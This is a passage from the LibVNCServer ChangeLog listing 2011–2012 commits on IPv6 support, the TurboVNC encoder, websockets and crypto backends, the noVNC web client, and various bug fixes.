	LibVNCServer, part four: add copyright notices to files with
	non-trivial changes.

2012-03-29  Johannes Schindelin <johannes.schindelin@gmx.de>

	* client_examples/SDLvncviewer.c: SDLvncviewer: map Apple/Windows
	keys correctly Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2012-03-29  Johannes Schindelin <johannes.schindelin@gmx.de>

	* .gitignore: gitignore the compiled gtkvncclient Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2012-03-29  Johannes Schindelin <johannes.schindelin@gmx.de>

	* client_examples/SDLvncviewer.c: SDLvncviewer: fix the SDL_KEYUP
	issue Keys got stuck because unicode is 0 upon SDL_KEYUP events, even if
	the same key event sets unicode correctly in SDL_KEYDOWN events.  Work around that for the common case (ASCII) using the fact that
	both SDL and X11 keysyms were created with ASCII compatibility in
	mind. So as long as we type ASCII symbols, we can map things
	trivially.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2012-03-23  DRC <information@virtualgl.org>

	* CMakeLists.txt: Extend support for the new TurboVNC encoder to the
	CMake build system

2012-03-25  DRC <information@virtualgl.org>

	* common/turbojpeg.c, common/turbojpeg.h, configure.ac,
	libvncserver/Makefile.am, libvncserver/rfbserver.c,
	libvncserver/tight.c, libvncserver/turbo.c, rfb/rfb.h,
	rfb/rfbproto.h, test/Makefile.am, test/bmp.c, test/bmp.h,
	test/tjbench.c, test/tjunittest.c, test/tjutil.c, test/tjutil.h: 
	Replace TightVNC encoder with TurboVNC encoder. This patch is the
	result of further research and discussion that revealed the
	following: -- TightPng encoding and the rfbTightNoZlib extension need not
	   conflict.  Since TightPng is a separate encoding type, not supported
	   by TurboVNC-compatible viewers, then the rfbTightNoZlib extension
	   can be used solely whenever the encoding type is Tight and disabled
	with the encoding type is TightPng.  -- In the TightVNC encoder, compression levels above 5 are basically
	   useless.  On the set of 20 low-level datasets that were used to
	   design the TurboVNC encoder (these include the eight 2D application
	   captures that were also used when designing the TightVNC encoder, as
	   well as 12 3D application captures provided by the VirtualGL
	   Project-- see
	   http://www.virtualgl.org/pmwiki/uploads/About/tighttoturbo.pdf),
	   moving from Compression Level (CL) 5 to CL 9 in the TightVNC
	   encoder did not increase the compression ratio of any datasets more
	   than 10%, and the compression ratio only increased by more than 5%
	   on four of them.  The compression ratio actually decreased a few
	   percent on five of them.  In exchange for this paltry increase in
	   compression ratio, the CPU usage, on average, went up by a factor of
	   5.  Thus, for all intents and purposes, TightVNC CL 5 provides the
	"best useful compression" for that encoder.  -- TurboVNC's best compression level (CL 2) compresses 3D and video
	   workloads significantly more "tightly" than TightVNC CL 5 (~70%
	   better, in the aggregate) but does not quite achieve the same level
	   of compression with 2D workloads (~20% worse, in the aggregate.)
	   This decrease in compression ratio may or may not be noticeable,
	   since many of the datasets it affects are not performance-critical
	   (such as the console output of a compilation, etc.) However, for
	   peace of mind, it was still desirable to have a mode that compressed
	   with equal "tightness" to TightVNC CL 5, since we proposed to
	replace that encoder entirely.  -- A new mode was discovered in the TurboVNC encoder that produces,
	   in the aggregate, similar compression ratios on 2D datasets as
	   TightVNC CL 5.  That new mode involves using Zlib level 7 (the same
	   level used by TightVNC CL 5) but setting the "palette threshold" to
	   256, so that indexed color encoding is used whenever possible.  This
	   mode reduces bandwidth only marginally (typically 10-20%) relative
	   to TurboVNC CL 2 on low-color workloads, in exchange for nearly
	   doubling CPU usage, and it does not benefit high-color workloads at
	   all (since those are usually encoded with JPEG.)  However, it
	provides a means of reproducing the same "tightness" as the TightVNC    encoder on 2D workloads without sacrificing any compression for
	   3D/video workloads, and without using any more CPU time than
	necessary.  -- The TurboVNC encoder still performs as well or better than the
	   TightVNC encoder when plain libjpeg is used instead of
	libjpeg-turbo.  Specific notes follow: common/turbojpeg.c common/turbojpeg.h: Added code to emulate the
	libjpeg-turbo colorspace extensions, so that the TurboJPEG wrapper
	can be used with plain libjpeg as well.  This required updating the
	TurboJPEG wrapper to the latest code from libjpeg-turbo 1.2.0,
	mainly because the TurboJPEG 1.2 API handles pixel formats in a much
	cleaner way, which made the conversion code easier to write.  It
	also eases the maintenance to have the wrapper synced as much as
	possible with the upstream code base (so I can merge any relevant
	bug fixes that are discovered upstream.) The libvncserver version of
	the TurboJPEG wrapper is a "lite" version, containing only the JPEG
	compression/decompression code and not the lossless transform, YUV
	encoding/decoding, and dynamic buffer allocation features from
	TurboJPEG 1.2.  configure.ac: Removed the --with-turbovnc option.  configure still
	checks for the presence of libjpeg-turbo, but only for the purposes
	of printing a performance warning if it isn't available.  rfb/rfb.h: Fix a bug introduced with the initial TurboVNC encoder
	patch.  We cannot use tightQualityLevel for the TurboVNC 1-100
	quality level, because tightQualityLevel is also used by ZRLE.
	Thus, a new parameter (turboQualityLevel) was created.  rfb/rfbproto.h: Remove TurboVNC-specific #ifdefs and language libvncserver/rfbserver.c: Remove TurboVNC-specific #ifdefs.  Fix
	afore-mentioned tightQualityLevel bug.  libvncserver/tight.c: Replaced the TightVNC encoder with the
	TurboVNC encoder.  Relative to the initial TurboVNC encoder patch,
	this patch also: -- Adds TightPng support to the TurboVNC encoder --
	   Adds the afore-mentioned low-bandwidth mode, which is mapped
	   externally to Compression Level 9 test/*: Included TJUnitTest (a regression test for the TurboJPEG
	wrapper) as well as TJBench (a benchmark for same.)  These are
	useful for ensuring that the wrapper still functions correctly and
	performantly if it needs to be modified for whatever reason.  Both
	of these programs are derived from libjpeg-turbo 1.2.0.  As with the
	TurboJPEG wrapper, they do not contain the more advanced features of
	TurboJPEG 1.2, such as YUV encoding/decoding and lossless
	transforms.

2012-03-15  Christian Beier <dontmind@freeshell.org>

	* AUTHORS: Add DRC to AUTHORS.

2012-03-15  Christian Beier <dontmind@freeshell.org>

	* rfb/rfb.h: Move tightsubsamplevel member to the end of rfbClient
	struct.  Try to not break ABI between releases. Even if the code gets ugly...

2012-03-10  DRC <information@virtualgl.org>

	* x11vnc/Makefile.am: Fix the build of x11vnc when an out-of-tree
	build directory is used

2012-03-10  DRC <information@virtualgl.org>

	* libvncserver/rfbserver.c: Fix an issue that affects the existing
	Tight encoder as well as the newly-implemented Turbo encoder.  The issue is that, when using the current libvncserver source, it is
	impossible to disable Tight JPEG encoding.  The way Tight/Turbo
	viewers disable JPEG encoding is by simply not sending the Tight
	quality value, causing the server to use the default value of -1.
	Thus, cl->tightQualityLevel has to be set to -1 prior to processing
	the encodings message for this mechanism to work.  Similarly, it is
	not guaranteed that the compress level will be set in the encodings
	message, so it is set to a default value prior to processing the
	message.

2012-03-10  DRC <information@virtualgl.org>

	* common/turbojpeg.c, common/turbojpeg.h, configure.ac,
	libvncserver/Makefile.am, libvncserver/rfbserver.c,
	libvncserver/turbo.c, rfb/rfb.h, rfb/rfbproto.h: Add TurboVNC
	encoding support.  TurboVNC is a variant of TightVNC that uses the same client/server
	protocol (RFB version 3.8t), and thus it is fully cross-compatible
	with TightVNC and TigerVNC (with one exception, which is noted
	below.) Both the TightVNC and TurboVNC encoders analyze each
	rectangle, pick out regions of solid color to send separately, and
	send the remaining subrectangles using mono, indexed color, JPEG, or
	raw encoding, depending on the number of colors in the subrectangle.
	However, TurboVNC uses a fundamentally different selection algorithm
	to determine the appropriate subencoding to use for each
	subrectangle.  Thus, while it sends a protocol stream that can be
	decoded by any TightVNC-compatible viewer, the mix of subencoding
	types in this protocol stream will be different from those generated
	by a TightVNC server.  The research that led to TurboVNC is described in the following
	report:
	http://www.virtualgl.org/pmwiki/uploads/About/tighttoturbo.pdf.  In
	summary:  20 RFB captures, representing "common" 2D and 3D
	application workloads (the 3D workloads were run using VirtualGL),
	were studied using the TightVNC encoder in isolation.  Some of the
	analysis features in the TightVNC encoder, such as smoothness
	detection, were found to generate a lot of CPU usage with little or
	no benefit in compression, so those features were disabled.  JPEG
	encoding was accelerated using libjpeg-turbo (which achieves a 2-4x
	speedup over plain libjpeg on modern x86 or ARM processors.)
	Finally, the "palette threshold" (minimum number of colors that the
	subrectangle must have before it is compressed using JPEG or raw)
	was adjusted to account for the fact that JPEG encoding is now quite
	a bit faster (meaning that we can now use it more without a CPU
	penalty.)  TurboVNC has additional optimizations, such as the
	ability to count colors and encode JPEG images directly from the
	framebuffer without first translating the pixels into RGB.  The
	TurboVNC encoder compares quite favorably in terms of compression
	ratio with TightVNC and generally encodes a great deal faster (often
	an order of magnitude or more.) The version of the TurboVNC encoder included in this patch is
	roughly equivalent to the one found in version 0.6 of the Unix
	TurboVNC Server, with a few minor patches integrated from TurboVNC
	1.1.  TurboVNC 1.0 added multi-threading capabilities, which can be
	added in later if desired (at the expense of making libvncserver
	depend on libpthread.) Because TurboVNC uses a fundamentally different mix of subencodings
	than TightVNC, because it uses the identical protocol (and thus a
	viewer really has no idea whether it's talking to a TightVNC or
	TurboVNC server), and because it doesn't support rfbTightPng (and in
	fact conflicts with it-- see below), the TurboVNC and TightVNC
	encoders cannot be enabled simultaneously.  Compatibility: In *most* cases, a TurboVNC-enabled viewer is fully compatible with
	a TightVNC server, and vice versa.  TurboVNC supports
	pseudo-encodings for specifying a fine-grained (1-100) quality scale
	and specifying chrominance subsampling.  If a TurboVNC viewer sends
	those to a TightVNC server, then the TightVNC server ignores them,
	so the TurboVNC viewer also sends the quality on a 0-9 scale that
	the TightVNC server can understand.  Similarly, the TurboVNC server
	checks first for fine-grained quality and subsampling
	pseudo-encodings from the viewer, and failing to receive those, it
	then checks for the TightVNC 0-9 quality pseudo-encoding.  There is one case in which the two systems are not compatible, and
	that is when a TightVNC or TigerVNC viewer requests compression
	level 0 without JPEG from a TurboVNC server.  For performance
	reasons, this causes the TurboVNC server to send images directly to
	the viewer, bypassing Zlib.  When the TurboVNC server does this, it
	also sets bits 7-4 in the compression control byte to rfbTightNoZlib
	(0x0A), which is unfortunately the same value as rfbTightPng.  Older
	TightVNC viewers that don't handle PNG will assume that the stream
	is uncompressed but still encapsulated in a Zlib structure, whereas
	newer PNG-supporting TightVNC viewers will assume that the stream is
	PNG.  In either case, the viewer will probably crash.  Since most
	VNC viewers don't expose compression level 0 in the GUI, this is a
	relatively rare situation.  Description of changes: configure.ac -- Added support for libjpeg-turbo.  If passed an
	   argument of --with-turbovnc, configure will now run (or, if cross-compiling, just link) a test program that determines
	   whether the libjpeg library being used is libjpeg-turbo.
	   libjpeg-turbo must be used when building the TurboVNC encoder,
	   because the TurboVNC encoder relies on the libjpeg-turbo
	   colorspace extensions in order to compress images directly out of
	   the framebuffer (which may be, for instance, BGRA rather than RGB.)
	   libjpeg-turbo can optionally be used with the TightVNC encoder as
	   well, but the speedup will only be marginal (the report linked above
	    explains why in more detail, but basically it's because of Amdahl's
	    Law.  The TightVNC encoder was designed with the assumption that
	JPEG had a very high CPU cost, and thus JPEG is used only
	sparingly.) -- Added a new configure variable, JPEG_LDFLAGS.  This
	   is necessitated by the fact that libjpeg-turbo often distributes
	   libjpeg.a and libjpeg.so in /opt/libjpeg-turbo/lib32 or
	   /opt/libjpeg-turbo/lib64, and many people prefer to statically
	   link with it.  Thus, more flexibility is needed than is provided by
	   --with-jpeg.  If JPEG_LDFLAGS is specified, then it overrides the
	   changes to LDFLAGS enacted by --with-jpeg (but --with-jpeg is
	   still used to set the include path.)  The addition of JPEG_LDFLAGS
	necessitated replacing AC_CHECK_LIB with AC_LINK_IFELSE (because
	   AC_CHECK_LIB automatically sets LIBS to -ljpeg, which is not what we
	want if we're, for instance, linking statically with libjpeg-turbo.)
	-- configure does not check for PNG support if TurboVNC encoding is
	   enabled.  This prevents the rfbSendRectEncodingTightPng() function
	   from being compiled in, since the TurboVNC encoder doesn't (and
	can't) support it.  common/turbojpeg.c, common/turbojpeg.h -- TurboJPEG is a simple API
	   used to compress and decompress JPEG images in memory.  It was
	   originally implemented because it was desirable to use different
	   types of underlying technologies to compress JPEG on different
	   platforms (mediaLib on SPARC, Quicktime on PPC Macs, Intel
	   Performance Primitives, etc.) These days, however, libjpeg-turbo
	   is the only underlying technology used by TurboVNC, so TurboJPEG's
	purpose is largely just code simplicity and flexibility.  Thus,
	   since there is no real need for libvncserver to use any technology
	   other than libjpeg-turbo for compressing JPEG, the TurboJPEG wrapper
	for libjpeg-turbo has been included in-tree so that libvncserver can
	   be directly linked with libjpeg-turbo.  This is convenient because
	   many modern Linux distros (Fedora, Ubuntu, etc.) now ship
	   libjpeg-turbo as their default libjpeg library.  libvncserver/rfbserver.c -- Added logic to check for the TurboVNC
	   fine-grained quality level and subsampling encodings and to map
	   Tight (0-9) quality levels to appropriate fine-grained quality level
	   and subsampling values if communicating with a TightVNC/TigerVNC
	viewer.  libvncserver/turbo.c -- TurboVNC encoder (compiled instead of
	libvncserver/tight.c) rfb/rfb.h -- Added support for the TurboVNC subsampling level rfb/rfbproto.h -- Added constants for the TurboVNC fine quality
	   level and subsampling encodings as well as the rfbTightNoZlib
	constant and notes on its usage.

2012-03-10  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c, libvncclient/listen.c,
	libvncclient/sockets.c, libvncclient/vncviewer.c,
	libvncserver/sockets.c, rfb/rfbclient.h: IPv6 support for
	LibVNCServer, part three: make reverse connections IPv6-capable.  Besided making libvncserver reverseVNC IPv6-aware, this introduces
	some changes on the client side as well to make clients listen on
	IPv6 sockets, too. Like the server side, this also uses a
	separate-socket approach.

2012-03-10  Christian Beier <dontmind@freeshell.org>

	* libvncserver/sockets.c: IPv6 support for LibVNCServer, part
	onepointseven: Plug a memleak.  We have to properly free the addrinfo struct when jumping out of the
	function.

2012-03-09  Christian Beier <dontmind@freeshell.org>

	* webclients/index.vnc: IPv6 support for LibVNCServer, part
	twopointone: properly surround IPv6 addresses with [] for noVNC URL.  Some browsers omit the square brackets in
	document.location.hostname, so add them if missing.

2012-02-27  Christian Beier <dontmind@freeshell.org>

	* libvncserver/cargs.c, libvncserver/httpd.c, libvncserver/main.c,
	rfb/rfb.h: IPv6 support for LibVNCServer, part two: Let the http
	server listen on IPv6, too.  As done with the RFB sockets, this uses a separate-socket approach
	as well.

2012-02-27  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c: IPv6 support for LibVNCServer, part
	onepointsix: fix a small logic error.  Without this, we would have gotten a stale IPv4 socket in a race
	condition.

2012-02-27  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c, libvncserver/sockets.c: IPv6 support for
	LibVNCServer, part onepointfive: Fix compilation with IPv6 missing.  There was an oversight that crept in...

2012-02-20  Christian Beier <dontmind@freeshell.org>

	* libvncserver/cargs.c, libvncserver/main.c,
	libvncserver/rfbserver.c, libvncserver/sockets.c, rfb/rfb.h: IPv6
	support for LibVNCServer, part one: accept IPv4 and IPv6
	connections.  This uses a separate-socket approach since there are systems that do
	not support dual binding sockets under *any* circumstances, for
	instance OpenBSD. Using separate sockets for IPv4 and IPv6 is thus
	more portable than having a v6 socket handle v4 connections as well.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2012-02-11  Mateus Cesar Groess <mateuscg@gmail.com>

	* AUTHORS, client_examples/Makefile.am,
	client_examples/gtkvncviewer.c, configure.ac: Here is a port of
	SDLvncviewer to GTK+2.  I think it may encourage people to implement more features for the
	viewer, because a GTK GUI seems to be easier to implement than a SDL
	one (and it is more integrated with the major Linux Desktops out
	there).  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2012-02-11  Christian Beier <dontmind@freeshell.org>

	* AUTHORS: Update AUTHORS.

2012-02-10  Kyle J. McKay <mackyle@gmail.com>

	* libvncserver/auth.c, libvncserver/rfbserver.c, rfb/rfb.h: Support
	Mac OS X vnc client with no password Support connections from the Mac OS X built-in VNC client to
	LibVNCServers running with no password and advertising a server
	version of 3.7 or greater.

2012-02-04  Johannes Schindelin <johannes.schindelin@gmx.de>

	* AUTHORS: Add Luca to the AUTHORS Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2012-02-04  Luca Stauble <gnekoz@gmail.com>

	* libvncclient/listen.c, libvncclient/sockets.c,
	libvncclient/vncviewer.c, rfb/rfbclient.h: Add an optional parameter
	to specify the ip address for reverse connections For security reasons, it can be important to limit which IP
	addresses a LibVNCClient-based client should listen for reverse
	connections. This commit adds that option.  To preserve binary backwards-compatibility, the field was added to
	the end of the rfbclient struct, and the function ListenAtTcpPort
	retains its signature (but calls the new ListenAtTcpPortAndAddress).  [jes: shortened the commit subject, added a longer explanation in
	the commit body and adjusted style] Signed-off-by: Luca Stauble <gnekoz@gmail.com> Signed-off-by:
	Johannes Schindelin <johannes.schindelin@gmx.de>

2012-01-12  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/websockets.c: websockets: removed debug message

2012-01-12  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/websockets.c: websockets: restore errno after logging
	an error

2012-01-12  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* CMakeLists.txt: cmake: adapted to latest websocket crypto changes

2011-12-15  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbclient.h: Small changes to LibNVCClient doxygen
	documentation.

2011-12-01  Christian Beier <dontmind@freeshell.org>

	* libvncserver/Makefile.am: Fix build error when libpng is
	available, but libjpeg is not.  The png stuff in tight.c depends on code in tight.c that uses
	libjpeg features. We could probably seperate that, but for now the
	dependency for 'tight' goes: PNG depends on JPEG depends on ZLIB.  This is reflected in Makefile.am now.  NB: Building tight.c with JPEG but without PNG is still possible,     but nor the other way around.

2011-12-01  Christian Beier <dontmind@freeshell.org>

	* configure.ac: Use AM_SILENT_RULES only when it's actually
	available.  Otherwise building breaks with older make versions. Happens on OS X
	10.6 for instance.

2011-11-09  Christian Beier <dontmind@freeshell.org>

	* configure.ac, webclients/Makefile.am, webclients/index.vnc,
	webclients/java-applet/Makefile.am, webclients/{ =>
	java-applet}/javaviewer.pseudo_proxy.patch, webclients/{ =>
	java-applet}/ssl/Makefile.am, webclients/{ =>
	java-applet}/ssl/README, webclients/{ =>
	java-applet}/ssl/index.vnc, webclients/{ =>
	java-applet}/ssl/onetimekey, webclients/{ =>
	java-applet}/ssl/proxy.vnc, webclients/{ =>
	java-applet}/ssl/ss_vncviewer, webclients/{ =>
	java-applet}/ssl/tightvnc-1.3dev7_javasrc-vncviewer-cursor-colors+n
	o-tab-traversal.patch, webclients/{ =>
	java-applet}/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	webclients/{ => java-applet}/ssl/ultra.vnc, webclients/{ =>
	java-applet}/ssl/ultraproxy.vnc, webclients/{ =>
	java-applet}/ssl/ultrasigned.vnc, webclients/{ =>
	java-applet}/ssl/ultravnc-102-JavaViewer-ssl-etc.patch: Move the
	java stuff into webclients/java-applet.

2011-11-09  Christian Beier <dontmind@freeshell.org>

	* LibVNCServer.spec.in, Makefile.am, README, configure.ac,
	examples/example.c, examples/pnmshow.c, examples/pnmshow24.c,
	rfb/rfb.h, {classes => webclients}/Makefile.am, {classes =>
	webclients}/index.vnc, {classes =>
	webclients}/javaviewer.pseudo_proxy.patch, {classes =>
	webclients}/novnc/LICENSE.txt, {classes =>
	webclients}/novnc/README.md, {classes =>
	webclients}/novnc/favicon.ico, {classes =>
	webclients}/novnc/include/base.css, {classes =>
	webclients}/novnc/include/base64.js, {classes =>
	webclients}/novnc/include/black.css, {classes =>
	webclients}/novnc/include/blue.css, {classes =>
	webclients}/novnc/include/des.js, {classes =>
	webclients}/novnc/include/display.js, {classes =>
	webclients}/novnc/include/input.js, {classes =>
	webclients}/novnc/include/logo.js, {classes =>
	webclients}/novnc/include/playback.js, {classes =>
	webclients}/novnc/include/rfb.js, {classes =>
	webclients}/novnc/include/ui.js, {classes =>
	webclients}/novnc/include/util.js, {classes =>
	webclients}/novnc/include/vnc.js, {classes =>
	webclients}/novnc/include/web-socket-js/README.txt, {classes =>
	webclients}/novnc/include/web-socket-js/swfobject.js, {classes =>
	webclients}/novnc/include/web-socket-js/web_socket.js, {classes =>
	webclients}/novnc/include/websock.js, {classes =>
	webclients}/novnc/include/webutil.js, {classes =>
	webclients}/novnc/vnc.html, {classes =>
	webclients}/novnc/vnc_auto.html, {classes =>
	webclients}/ssl/Makefile.am, {classes => webclients}/ssl/README,
	{classes => webclients}/ssl/index.vnc, {classes =>
	webclients}/ssl/onetimekey, {classes => webclients}/ssl/proxy.vnc,
	{classes => webclients}/ssl/ss_vncviewer, {classes =>
	webclients}/ssl/tightvnc-1.3dev7_javasrc-vncviewer-cursor-colors+no
	-tab-traversal.patch, {classes =>
	webclients}/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	{classes => webclients}/ssl/ultra.vnc, {classes =>
	webclients}/ssl/ultraproxy.vnc, {classes =>
	webclients}/ssl/ultrasigned.vnc, {classes =>
	webclients}/ssl/ultravnc-102-JavaViewer-ssl-etc.patch: Rename
	'classes' dir to 'webclients'.

2011-11-09  Christian Beier <dontmind@freeshell.org>

	* classes/index.vnc, libvncserver/httpd.c: novnc client: use the
	client's notion about the server hostname instead of what the server
	thinks.

2011-11-09  Christian Beier <dontmind@freeshell.org>

	* classes/index.vnc: Fix tiny typo.

2011-11-09  Christian Beier <dontmind@freeshell.org>

	* NEWS: Add 0.9.8.2 NEWS entry.

2011-11-09  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: When GetCredential() callback is not set,
	don't use authentications requiring it.  The auth methods that employ Getcredential() will only be used if
	the client's GetCredential callback is actually set.

2011-10-12  Christian Beier <dontmind@freeshell.org>

	* ChangeLog: Update ChangeLog for 0.9.8.1.

2011-10-12  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, NEWS, configure.ac: Update version number in
	autotools && cmake, NEWS entry.

2011-10-26  Peter Watkins <watkipet@gmail.com>

	* rfb/rfbclient.h: Added comments.

2011-10-26  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: Fix deadlock in threaded mode when using
	nested rfbClientIteratorNext() calls.  Lengthy explanation follows...  First, the scenario before this patch: We have three clients 1,2,3 connected. The main thread loops through
	them using rfbClientIteratorNext() (loop L1) and is currently at
	client 2 i.e. client 2's cl_2->refCount is 1. At this point we need
	to loop again through the clients, with cl_2->refCount == 1, i.e. do
	a loop L2 nested within loop L1.  BUT: Now client 2 disconnects, it's clientInput thread terminates
	its clientOutput thread and calls rfbClientConnectionGone(). This
	LOCKs clientListMutex and WAITs for cl_2->refCount to become 0. This
	means this thread waits for the main thread to release cl_2.
	Waiting, with clientListMutex LOCKed! Meanwhile, the main thread is about to begin the inner
	rfbClientIteratorNext() loop L2. The first call to
	rfbClientIteratorNext() LOCKs clientListMutex. BAAM. This mutex is
	locked by cl2's clientInput thread and is only released when
	cl_2->refCount becomes 0. The main thread would decrement
	cl_2->refCount when it would continue with loop L1. But it's waiting
	for cl2's clientInput thread to release clientListMutex. Which never
	happens since this one's waiting for the main thread to decrement
	cl_2->refCount. DEADLOCK.  Now, situation with this patch: Same as above, but when client 2 disconnects it's clientInput thread
	rfbClientConnectionGone(). This again LOCKs clientListMutex, removes
	cl_2 from the linked list and UNLOCKS clientListMutex. The WAIT for
	cl_2->refCount to become 0 is _after_ that. Waiting, with
	clientListMutex UNLOCKed! Therefore, the main thread can continue, do the inner loop L2 (now
	only looping through 1,3 - 2 was removed from the linked list) and
	continue with loop L1, finally decrementing cl_2->refCount, allowing
	cl2's clientInput thread to continue and terminate. The resources
	held by cl2 are not free()'d by rfbClientConnectionGone until
	cl2->refCount becomes 0, i.e. loop L1 has released cl2.

2011-10-16  Johannes Schindelin <johannes.schindelin@gmx.de>

	* AUTHORS: Update AUTHORS Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-10-16  George Fleury <gfleury@gmail.com>

	* libvncserver/rfbserver.c: Fix memory leak I was debbuging some code tonight and i found a pointer that is not
	been freed, so i think there is maybe a memory leak, so it is...  there is the malloc caller reverse order: ( malloc cl->statEncList )         <- rfbStatLookupEncoding         <- rfbStatRecordEncodingSent         <- rfbSendCursorPos         <- rfbSendFramebufferUpdate         <- rfbProcessEvents I didnt look the whole libvncserver api, but i am using
	rfbReverseConnection with rfbProcessEvents, and then when the client
	connection dies, i am calling a rfbShutdownServer and
	rfbScreenCleanup, but the malloc at rfbStatLookupEncoding isnt been
	freed.  So to free the stats i added a rfbResetStats(cl) after
	rfbPrintStats(cl) at rfbClientConnectionGone in rfbserver.c before
	free the cl pointer. (at rfbserver.c line 555). And this, obviously,
	is correcting the memory leak.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-10-08  Johannes Schindelin <johannes.schindelin@gmx.de>

	* rfb/rfbclient.h: Hopefully fix the crash when updating from 0.9.7
	or earlier For backwards-compatibility reasons, we can only add struct members
	to the end. That way, existing callers still can use newer
	libraries, as the structs are always allocated by the library (and
	therefore guaranteed to have the correct size) and still rely on the
	same position of the parts the callers know about.  Reported by Luca Falavigna.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-10-09  Johannes Schindelin <johannes.schindelin@gmx.de>

	* client_examples/SDLvncviewer.c: SDLvncviewer: make it resizable by
	default I got annoyed having to specify -resizable all the time; I never use
	it in another mode anymore, since I am on a netbook.  The option -no-resizable was added to be able to switch off that
	feature.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-10-06  Christian Beier <dontmind@freeshell.org>

	* libvncserver/httpd.c: httpd: fix sending of binary data such as
	images.  We do this simply by omitting the content-type and let the browser
	decide upon the mime-type of the sent file. Only exception is
	'index.vnc', where we do set the content-type since some browsers
	fail to detect it's html when it's ending in '.vnc' Also, remove superfluous #defines. We close the connection always.

2011-10-06  Christian Beier <dontmind@freeshell.org>

	* classes/index.vnc: Fix typo && use proper website.

2011-10-04  Christian Beier <dontmind@freeshell.org>

	* classes/index.vnc, classes/novnc/LICENSE.txt,
	classes/novnc/README.md, classes/novnc/favicon.ico,
	classes/novnc/include/base.css, classes/novnc/include/base64.js,
	classes/novnc/include/black.css, classes/novnc/include/blue.css,
	classes/novnc/include/des.js, classes/novnc/include/display.js,
	classes/novnc/include/input.js, classes/novnc/include/logo.js,
	classes/novnc/include/playback.js, classes/novnc/include/rfb.js,
	classes/novnc/include/ui.js, classes/novnc/include/util.js,
	classes/novnc/include/vnc.js,
	classes/novnc/include/web-socket-js/README.txt,
	classes/novnc/include/web-socket-js/swfobject.js,
	classes/novnc/include/web-socket-js/web_socket.js,
	classes/novnc/include/websock.js, classes/novnc/include/webutil.js,
	classes/novnc/vnc.html, classes/novnc/vnc_auto.html,
	libvncserver/httpd.c: Add noVNC HTML5 client connect possibility to
	our http server.  Pure JavaScript, no Java plugin required anymore! (But a recent
	browser...)

2011-10-04  Christian Beier <dontmind@freeshell.org>

	* configure.ac: This build warning is a libvncserver one, not for
	x11vnc.  Also, make it warn more generally when no known encryption lib is
	available.

2011-09-21  Gernot Tenchio <gernot@tenchio.de>

	* common/md5.c: md5: forced to use function names with leading
	underscores Commented out the surrounding '#ifdef _LIBC' to build md5.o with
	leading underscores. This is required to match the prototypes
	defined in md5.h.

2011-09-20  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/rfbcrypto_included.c: rfbcrypto_included: fix c&p
	errors

2011-09-20  Gernot Tenchio <gernot@tenchio.de>

	* libvncserver/rfbcrypto_polarssl.c: rfbcrypto_polarssl: it was way
	to late last night...

2011-09-18  Gernot Tenchio <gernot@tenchio.de>

	* libvncserver/Makefile.am, libvncserver/rfbcrypto.h,
	libvncserver/rfbcrypto_gnutls.c, libvncserver/rfbcrypto_included.c,
	libvncserver/rfbcrypto_openssl.c,
	libvncserver/rfbcrypto_polarssl.c, libvncserver/websockets.c: Add
	support for different crypto implementations

2011-09-11  Christian Beier <dontmind@freeshell.org>

	* configure.ac, libvncserver/Makefile.am: Autotools: Fix OpenSSL and
	GnuTLS advertisement.

2011-09-11  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbssl_gnutls.c: Fix libvncserver GnuTLS init.  gnutls_certificate_set_x509_trust_file() returns the number of
	processed certs and _not_ GNUTLS_E_SUCCESS (0) on success!

2011-09-11  Christian Beier <dontmind@freeshell.org>

	* AUTHORS, libvncserver/websockets.c: Update AUTHORS regarding the
	websocket guys.

2011-08-28  Gernot Tenchio <gernot@tenchio.de>

	* configure.ac: configure: Add AM_SILENT_RULES Working with âsilent make modeâ makes debugging a lot of easier
	since warnings wont shadowed by useless compiler noise

2011-08-27  Gernot Tenchio <gernot@tenchio.de>

	* CMakeLists.txt: cmake: set SOVERSION

2011-09-11  Christian Beier <dontmind@freeshell.org>

	* configure.ac, libvncserver/Makefile.am: Autotools: Fix OpenSSL and
	GnuTLS advertisement.

2011-09-11  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbssl_gnutls.c: Fix libvncserver GnuTLS init.  gnutls_certificate_set_x509_trust_file() returns the number of
	processed certs and _not_ GNUTLS_E_SUCCESS (0) on success!

2011-09-11  Christian Beier <dontmind@freeshell.org>

	* AUTHORS, libvncserver/websockets.c: Update AUTHORS regarding the
	websocket guys.

2011-09-02  Gernot Tenchio <gernot@tenchio.de>

	* libvncserver/websockets.c: websocket: Use a single buffer for
	both, encoding and decoding

2011-08-30  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/rfbssl_gnutls.c: rfbssl_gnutls: Merge
	rfbssl_peek/rfbssl_read into one function

2011-08-30  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/websockets.c: websockets: fix
	webSocketCheckDisconnect() Do not consume the peeked data if no close frame was detected.

2011-08-29  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/websockets.c: websockets: use 32bit Xor in
	webSocketsDecodeHybi()

2011-08-29  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* CMakeLists.txt: cmake: use sha1.c for websocket builds

